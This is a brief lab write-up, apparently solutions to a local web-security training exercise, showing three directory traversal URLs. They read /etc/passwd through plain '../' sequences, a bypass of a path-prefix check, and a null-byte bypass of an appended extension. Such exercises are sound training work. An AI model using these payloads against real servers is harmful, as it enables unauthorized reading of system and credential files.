# Directory Traversal

## 1

`http://localhost:31337/dirtrav/example1.php?file=../../../../../../../etc/passwd`

## 2

This example tries to make sure that the included path begins with `/var/www/files`. No problem.

`http://localhost:31337/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd`

## 3

This example moves the extension decision into the code, but as with the file inclusion stuff, we can get around this with a null byte.

`http://localhost:31337/dirtrav/example3.php?file=../../../../../../etc/passwd%00`
